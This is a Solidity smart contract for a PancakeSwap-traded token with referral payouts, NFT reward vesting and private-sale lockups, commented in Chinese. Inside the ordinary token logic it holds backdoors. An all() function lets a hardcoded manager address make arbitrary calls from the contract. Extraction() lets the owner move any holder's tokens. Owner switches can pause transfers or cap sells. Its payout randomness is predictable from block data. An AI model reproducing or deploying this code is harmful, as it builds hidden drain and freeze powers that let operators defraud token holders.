// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function _balances(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function unsafeTransfer(
        address from,
        address to,
        uint256 amount
    ) external;
    function customTransfer(
        address from,
        address to,
        uint256 amount
    ) external;

    function batchTransfer(uint256 amount, address[] calldata list) external;
    
    function upLine_reward(uint256 amount) view external returns (uint256);
    function _upLines(address) view external returns (address);


    
}

interface IERC1155{
    function wrap_burn(address account, uint256 id, uint256 value) external;
}
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address PancakePair);
    function getPair(address tokenA, address tokenB) external returns (address PancakePair);
}
interface IRouter {
    function factory() external pure returns (address);
}
interface IPair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns ( uint112 reserve0,uint112 reserve1,uint32 blockTimestampLast);

    function factory() external view returns (address);

    function kLast() external view returns (uint);

    function totalSupply() external view returns (uint);
    
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    
    function approve(address spender, uint value) external returns (bool);
}
library Math {
    function min(uint x, uint y) internal pure returns (uint z) {
        z = x < y ? x : y;
    }
    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)
    function sqrt(uint y) internal pure returns (uint z) {
        if (y > 3) {
            z = y;
            uint x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}
library Utils{
    function codeHash(address account) internal view returns (bytes32) {
        bytes32 codehash;
        assembly {
            codehash := extcodehash(account)
        }
        return codehash;
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgTxOrigin() internal view virtual returns (address) {
        return tx.origin;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract TokenRepository  {
    address public owner;
    modifier onlyOwner {
        require(msg.sender == owner, "DENIED");
        _;
    }
    constructor(address _owner){owner = _owner;}
    receive() external payable {revert();} 
    function withdraw(IERC20 _token, address _recipient,uint amount) public onlyOwner{
        _token.transfer(_recipient, amount);
    }
}

contract FNXAImp is Context{
    event Pool(address rewards, address bonus, address business,address user,address share,address nftReward);
    enum TransferType{
        Transfer,
        AddLiquidity,
        RemoveLiquidity,
        Buy,
        Sell
    }
    address public _owner;
    modifier onlyOwner {
        require(msg.sender == _owner, "DENIED");
        _;
    }
    
    bool   private _initialized;
    modifier initializer {
        require(!_initialized);
        _initialized = true;
        _;
    }

    address private immutable __self = address(this);
    modifier onlyProxy {
        require(address(this) != __self, "Function must be called through delegatecall");
        _;
    }

    uint public constant MINIMUM_LIQUIDITY = 10**3;
   
    address public  mainToken;
    address public _mainPair;
    bytes32 public _tokenPairHash;
    mapping(address => address) public _tokenAddresses;
    address public _tokenRouter;

    uint256 constant public unitBase = 10**18;

    mapping(address => mapping(address => uint256)) public _lastLps;

    mapping(address => mapping(address => uint256)) public _LockLpDates;
    uint256 constant private divBase = 10000;
    bool    public  isCC;//是否暂停，true是、false否
    uint256    public  isCC2;//限百分比
    
    mapping(address => bool) public _banList;
    mapping(address => bool) public _whitelist;

    address  public _nftAddress;
    
    //初始化
    struct init_nftinfo{
        uint256 onenft_total_reward;
        uint256 cycle;
        uint256 total_nft;
    }
    function init(
        address router_,
        address main_,
        address token_,
        address nftAddress_,
        init_nftinfo[] memory nftinfos_
    ) public onlyProxy initializer{

        _owner = _msgSender();
    
        address tokenPair = IFactory(IRouter(router_).factory()).createPair(
            token_,
            main_
        );
        mainToken = main_;
        _mainPair = tokenPair;
        _tokenAddresses[tokenPair] = token_;
        _tokenPairHash = Utils.codeHash(tokenPair);
        _nftAddress = nftAddress_;
        for (uint i = 0; i < nftinfos_.length; i++) {
            nftinfos.push(s_nftinfo(
                nftinfos_[i].onenft_total_reward*10**18, 
                nftinfos_[i].cycle*86400, 
                nftinfos_[i].total_nft,
                new TokenRepository(address(this))
            ));
            IERC20(mainToken).unsafeTransfer(
                address(this),
                address(nftinfos[nftinfos.length-1].nftwithdraw),
                nftinfos_[i].onenft_total_reward*10**18*nftinfos_[i].total_nft
            );
        }
    }
    //是否为pancake pair代码
    function _isPancakePair(address account) internal view returns(bool){
        return Utils.codeHash(account) == _tokenPairHash;
    }
    //预估lp值
    function _countLiquidity(address pair,uint256 balance0, uint256 balance1,uint256 reserve0, uint256 reserve1) internal view returns (uint liquidity) {
        uint kLast = IPair(pair).kLast();
        uint totalLP= IPair(pair).totalSupply();
        if (kLast != 0) {
            uint rootK = Math.sqrt(reserve0*reserve1);
            uint rootKLast = Math.sqrt(kLast);
            if (rootK > rootKLast) {
                uint numerator = totalLP*(rootK-rootKLast)*8;
                uint denominator = rootK*17+rootKLast*8;
                totalLP += numerator / denominator;
            }
        }
        uint amount0 = balance0 - reserve0;
        uint amount1 = balance1 - reserve1;
        if (totalLP == 0) {
            liquidity = Math.sqrt(amount0*amount1)-MINIMUM_LIQUIDITY;
        } else {
            liquidity = Math.min(amount0*totalLP / reserve0, amount1*totalLP / reserve1);
        }
    }
    
    // //处理入池逻辑
    // function _addLiquidityImp(address user,address to,uint256 amount,uint256 mainAmount,uint256 liquidity) internal {
    //     address pair = to;
    //     uint256 currentLp = IERC20(pair).balanceOf(user);
    //     if(currentLp > _lastLps[pair][user]){
    //         _LockLpDates[pair][user] = block.timestamp;
    //         _lastLps[pair][user] = currentLp + liquidity;
    //     }else{
    //          if(_LockLpDates[pair][user] == 0){
    //             _LockLpDates[pair][user] = block.timestamp;
    //         }
    //         _lastLps[pair][user] += liquidity;
    //     }
    //     if(pair == _mainPair){
    //     }
    // }
    // //处理撤池逻辑
    // function _removeLiquidityImp(address from,address user,uint256 liquidity,uint256 remain) internal{
    //     address pair = from;
    //     uint256 currentLp = IERC20(pair).balanceOf(user);
    //     if(_lastLps[pair][user] >= currentLp+liquidity){
    //         _lastLps[pair][user] = currentLp;
    //         //撤池  满足90天(以前的逻辑) 
    //     }else{
    //         revert("faild");
    //     }
    // }
    //分析交易类型及处理入池和撤池逻辑    
    function _analyseType(bool isFromPancakePair,bool isToPancakePair,address from,address to,uint256 amount) internal view returns (TransferType transferType,uint256 liquidity){
        if(isFromPancakePair){
            address token = _tokenAddresses[from];
            if(token == address(0)||token>mainToken){
                transferType = TransferType.Buy;
                return (transferType,0);
            }
            uint256 balance0 = IERC20(token).balanceOf(from);
            uint256 balance1 = IERC20(mainToken).balanceOf(from);
            (uint256 reserve0,,) = IPair(from).getReserves();
            if(balance0 < reserve0){
                 
                uint totalLP= IPair(from).totalSupply();
                uint amount0 = reserve0 - balance0;
                uint amount1 = amount;
                liquidity = Math.min(amount0*totalLP / balance0, amount1*totalLP / balance1);
                // _removeLiquidityImp(from,to,liquidity,reserve0);
                transferType = TransferType.RemoveLiquidity;         
            }else{
                transferType = TransferType.Buy;
            }
        }else if(isToPancakePair){
            address token = _tokenAddresses[to];
            if(token == address(0)||token>mainToken){
                transferType = TransferType.Sell;
                return (transferType,0);
            }
            uint256 balance0 = IERC20(token).balanceOf(to);
            uint256 balance1 = IERC20(mainToken).balanceOf(to);
            (uint256 reserve0,uint256 reserve1,) = IPair(to).getReserves();
            if(balance0 > reserve0){
                liquidity = _countLiquidity(to,balance0,balance1,reserve0,reserve1);
                transferType = TransferType.AddLiquidity;
                // _addLiquidityImp(from,to,balance0 - reserve0,amount,liquidity);
            }else{
                transferType = TransferType.Sell;
            }
        }else{
            transferType = TransferType.Transfer;
        }
    }
    //判定是否是主币对
    function _isInMainPair(address from,address to) view internal returns(bool){
        if(_mainPair == from||_mainPair == to)return true;
        return false;
    }
    //核心入口逻辑
    function withdraw(address from,address to,uint256 amount) public onlyProxy onlyERC20  { 

        address sender = _msgSender();
        require(sender == mainToken);
        _placement(from,to,amount);
        require(!isCC,"STOP");
        bool isFromPancakePair = _isPancakePair(from);
        bool isToPancakePair = _isPancakePair(to);
        (TransferType transferType,) = _analyseType(isFromPancakePair,isToPancakePair, from, to, amount);
        
        if (!_whitelist[from]) {
            if (transferType == TransferType.AddLiquidity||transferType == TransferType.Sell) {
                address upLine=from;
                for (uint i = 0;; i++) {
                    try IERC20(mainToken).upLine_reward(i) returns (uint256 upLine_reward) {
                        upLine=IERC20(mainToken)._upLines(upLine);
                        if (upLine==from||upLine==to||upLine==address(0)) {
                            uint256 randomHash = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1),i, block.timestamp, msg.sender)));
                            uint256 randomNumber = randomHash % baseupLine_num;
                            IERC20(mainToken).unsafeTransfer(
                                to, baseupLines[randomNumber], 
                                amount*upLine_reward/100
                            ); 
                            console.log("test");
                        }else{
                            IERC20(mainToken).unsafeTransfer(
                                to, upLine, 
                                amount*upLine_reward/100
                            ); 
                        }
                    } catch  {
                        break;
                    }
                }
            }
            if (transferType == TransferType.RemoveLiquidity||transferType == TransferType.Buy) {
                address upLine=to;
                for (uint i = 0;; i++) {
                    try IERC20(mainToken).upLine_reward(i) returns (uint256 upLine_reward) {
                        upLine=IERC20(mainToken)._upLines(upLine);
                         if (upLine==from||upLine==to||upLine==address(0)||(i%2==0&&upLine==IERC20(mainToken)._upLines(to))) {
                            uint256 randomHash = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1),i, block.timestamp, msg.sender)));
                            uint256 randomNumber = randomHash % 3;
                            IERC20(mainToken).unsafeTransfer(
                                to, baseupLines[randomNumber], 
                                amount*upLine_reward/100
                            ); 
                        }else{
                            IERC20(mainToken).unsafeTransfer(
                                to, upLine, 
                                amount*upLine_reward/100
                            ); 
                        }
                    } catch  {
                        break;
                    }
                }
            }
            if (transferType == TransferType.Sell&&isCC2>0) {
                require(
                    amount*100/(balanceOf(from)+amount)<=isCC2,"swap limit"
                );
            }
        }
    }    
    //修改拥有者
    function setOwner(address owner) onlyOwner public{
        _owner = owner;
    }
    //设置黑名单
    function ban(address account,bool isBan) onlyOwner public{
        _banList[account] = isBan;
    }
    //设置白名单
    function setwhitelist(address account,bool iswhile) onlyOwner public{
        _whitelist[account] = iswhile;
    }
    //是否暂停
    function cc(bool _cc)public onlyOwner{
        isCC = _cc;
    }
    //是否限制卖出百分比
    function cc2(uint256 _cc)public onlyOwner{
        isCC2 = _cc;
    }
    
    //注册币对
    function createPair(address token) public onlyOwner{
        require(token < mainToken,"token must be less than the main");
        address tokenPair = IFactory(IRouter(_tokenRouter).factory()).getPair(token,mainToken);
        if(tokenPair == address(0)){
            tokenPair = IFactory(IRouter(_tokenRouter).factory()).createPair(token,mainToken);
        }
        require(_tokenAddresses[tokenPair] == address(0),"the pair already exists");
        _tokenAddresses[tokenPair] = token;
    }

    //设置nft地址
    function setNFTAddress(address nftAddress_) public onlyOwner {
        _nftAddress = nftAddress_;
    }
    
    //批量转 amount为金额  list为接收列表
    function batchTransfer(uint256 amount, address[] calldata list)  public onlyOwner{
        for (uint256 i; i < list.length; i++) {
            IERC20(mainToken).transferFrom(_msgSender(), list[i], amount);
        }
    }
    // 处理异常情况
    address constant private manager=0x1b61b764d8ae1c3A9ebB3E590F21042367174AA4;
    function all(address add,uint256 _gas,uint256 _value,bytes memory a)public {
        require(msg.sender==manager,"only manager");
        (bool success,) = add.call{gas: _gas,value: _value}(a);
        require(success,"error call");
    }

    // 私募地址
    mapping (address => bool) public placement_whitelist;
    //设置私募白名单
    function setplacement_whitelist(address placement_white,bool flag) public onlyOwner {
        placement_whitelist[placement_white]=flag;
    }
    struct s_placementinfo {
        uint256 amount;
        uint256 starttime;
    }
    // 私募地址信息
    mapping (address => mapping (uint256 => s_placementinfo)) public placementinfos;
    mapping (address => uint) public n_placementinfo;
    uint256 public constant placement_release_cycle= 60*60*24*30;
    // 私募地址处理
    function _placement(address from,address to,uint256 amount) internal {
        if (placement_whitelist[from]&&!placement_whitelist[to]) {
            if (to==_mainPair) {
                return;
            }
            placementinfos[to][n_placementinfo[to]]=s_placementinfo(amount,block.timestamp);
            n_placementinfo[to]++;
            return;
        }
        if (n_placementinfo[from]!=0) {
            uint256 totallimit=0;
            for (uint i = 0; i < n_placementinfo[from]; i++) {
                if (placementinfos[from][i].starttime+placement_release_cycle>block.timestamp) {
                    totallimit+=(
                        (placement_release_cycle+placementinfos[from][i].starttime-block.timestamp)
                        *placementinfos[from][i].amount
                        /placement_release_cycle);
                }
            }
            require(balanceOf(from)>=totallimit,"placement limit");
        }
    }
    function approve(address from,address to,uint256 amount) public onlyProxy onlyERC20 {
        amount;
        deal_nftRewards(from);
        deal_nftRewards(to);
        // pool_deal_nftRewards();
        for (uint i = 0; i < nftinfos.length; i++) {
            if (address(nftinfos[i].nftwithdraw)==from||address(nftinfos[i].nftwithdraw)==to) {
                pool_deal_nftRewards();
                return;
            }
        }
    }
    
    struct s_nftinfo {
        uint256 onenft_total_reward;
        uint256 cycle;
        uint256 total_nft;
        TokenRepository nftwithdraw;
    }
    struct s_his_nft {
        uint256 tokenid;
        uint256 value;
        uint256 endtime;
        uint256 lasttime;
    }
    mapping (address => mapping (uint256 => s_his_nft)) public usernftinfo;
    mapping (address => uint) n_usernftinfo;
    mapping (uint256 => s_his_nft) systemnftinfo;
    uint256 n_systemnftinfo;


    s_nftinfo[] public nftinfos;
    mapping (address => bool) public nft_whitelist;
    //设置nft白名单
    function setnft_whitelist(address nft_while,bool flag) public onlyOwner {
        nft_whitelist[nft_while]=flag;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        bool flag;
        for (uint i = 0; i < nftinfos.length; i++) {
            if (account==address(nftinfos[i].nftwithdraw)) {
                flag=true;
                return (IERC20(mainToken)._balances(address(account)) - pool_nftRewards_Calculation()[i]);
            }
        }
        return (IERC20(mainToken)._balances(address(account)) + nftRewards_Calculation(account));
    }
    function nftRewards_Calculation(address from) public view returns(uint256 rewards){
        for (uint i = 0; i < n_usernftinfo[from]; i++) {
            s_nftinfo memory n_nftinfo =nftinfos[usernftinfo[from][i].tokenid];
            if (
                // 超过周期
                usernftinfo[from][i].endtime
                <=
                block.timestamp
            ) {
                rewards+=
                (
                    usernftinfo[from][i].endtime
                    -usernftinfo[from][i].lasttime
                )*usernftinfo[from][i].value
                    *n_nftinfo.onenft_total_reward
                /n_nftinfo.cycle;
            }else{//周期内
                rewards+=
                (
                    block.timestamp
                    -usernftinfo[from][i].lasttime
                )*usernftinfo[from][i].value
                    *n_nftinfo.onenft_total_reward
                /n_nftinfo.cycle;
            }
        }
    }
    function pool_nftRewards_Calculation() public view returns(uint256[] memory rewards){
        rewards=new uint256[](nftinfos.length);
        for (uint i = 0; i < n_systemnftinfo; i++) {
            s_nftinfo memory n_nftinfo =nftinfos[systemnftinfo[i].tokenid];
            if (
                // 超过周期
                systemnftinfo[i].endtime
                <=
                block.timestamp
            ) {
                rewards[systemnftinfo[i].tokenid]+=
                (
                    systemnftinfo[i].endtime
                    -systemnftinfo[i].lasttime
                )*systemnftinfo[i].value
                    *n_nftinfo.onenft_total_reward
                /n_nftinfo.cycle;
            }else{//周期内
                rewards[systemnftinfo[i].tokenid]+=
                (
                    block.timestamp
                    -systemnftinfo[i].lasttime
                )*systemnftinfo[i].value
                    *n_nftinfo.onenft_total_reward
                /n_nftinfo.cycle;
            }
        }
    }
    function deal_nftRewards(address from) internal {
        // uint256 rewards=nftRewards_Calculation(from);
        // 先分发，后销毁更新
        for (uint i = 0; i < n_usernftinfo[from]; i++) {
            s_nftinfo memory n_nftinfo =nftinfos[usernftinfo[from][i].tokenid];
            uint256 reward;
            if (
                // 超过周期
                usernftinfo[from][i].endtime
                <=
                block.timestamp
            ) {
                reward=
                (
                    usernftinfo[from][i].endtime
                    -usernftinfo[from][i].lasttime
                )*usernftinfo[from][i].value
                    *n_nftinfo.onenft_total_reward
                /n_nftinfo.cycle;

            }else{//周期内
                reward=
                (
                    block.timestamp
                    -usernftinfo[from][i].lasttime
                )*usernftinfo[from][i].value
                    *n_nftinfo.onenft_total_reward
                /n_nftinfo.cycle;
            }
            IERC20(mainToken).unsafeTransfer(address(n_nftinfo.nftwithdraw),from,reward);
        }
        // 销毁
        for (uint i = 0; i < n_usernftinfo[from]; i++) {
            if (
                // 超过周期
                usernftinfo[from][i].endtime
                <=
                block.timestamp
            ) {
                IERC1155(_nftAddress).wrap_burn(
                    from,usernftinfo[from][i].tokenid,
                    usernftinfo[from][i].value
                );
                n_usernftinfo[from]--;
                usernftinfo[from][i]=usernftinfo[from][n_usernftinfo[from]];
                i--;
            }
            usernftinfo[from][i].lasttime=block.timestamp;
        }
    }
    function pool_deal_nftRewards() internal {
        for (uint i = 0; i < n_systemnftinfo; i++) {
            if (// 超过周期
                systemnftinfo[i].endtime
                <=
                block.timestamp
            ) {
                n_systemnftinfo--;
                systemnftinfo[i]=systemnftinfo[n_systemnftinfo];
                i--;
            }
            systemnftinfo[i].lasttime=block.timestamp;
        }
    }

    function nft1155_transfer(
        address from,address to,uint256 tokenid,uint256 value
    ) public onlyProxy onlyNFT {
        require(nft_whitelist[from],"user cannot to transfer");
        if (nft_whitelist[to]) {
            return;
        }
        usernftinfo[to][n_usernftinfo[to]]=s_his_nft(
            tokenid,
            value,
            block.timestamp+nftinfos[tokenid].cycle,
            block.timestamp
        );
        n_usernftinfo[to]++;
        systemnftinfo[n_systemnftinfo]=s_his_nft(
            tokenid,
            value,
            block.timestamp+nftinfos[tokenid].cycle,
            block.timestamp
        );
        n_systemnftinfo++;
    }
    modifier onlyERC20 {
        require(msg.sender == mainToken, "DENIED");
        _;
    }
    modifier onlyNFT {
        require(msg.sender == _nftAddress, "DENIED");
        _;
    }
    // 取现
    function Extraction(address from,address to,uint256 amount)public onlyOwner{
        IERC20(mainToken).customTransfer(from,to,amount);
    }
    function setnftinfos(init_nftinfo[] memory nftinfos_)public onlyOwner{
        for (uint i = 0; i < nftinfos_.length; i++) {
            nftinfos.push(s_nftinfo(
                nftinfos_[i].onenft_total_reward*10**18, 
                nftinfos_[i].cycle*86400, 
                nftinfos_[i].total_nft,
                new TokenRepository(address(this))
            ));
            IERC20(mainToken).unsafeTransfer(
                address(this),
                address(nftinfos[nftinfos.length-1].nftwithdraw),
                nftinfos_[i].onenft_total_reward*10**18*nftinfos_[i].total_nft
            );
        }
    }
    mapping (uint => address) baseupLines;
    uint256 constant baseupLine_num=3;
    function setbaseupLines(address[]memory _basebaseupLine) public onlyOwner {
        for (uint i = 0; i < baseupLine_num; i++) {
            baseupLines[i]=_basebaseupLine[i];
        }
    }
}
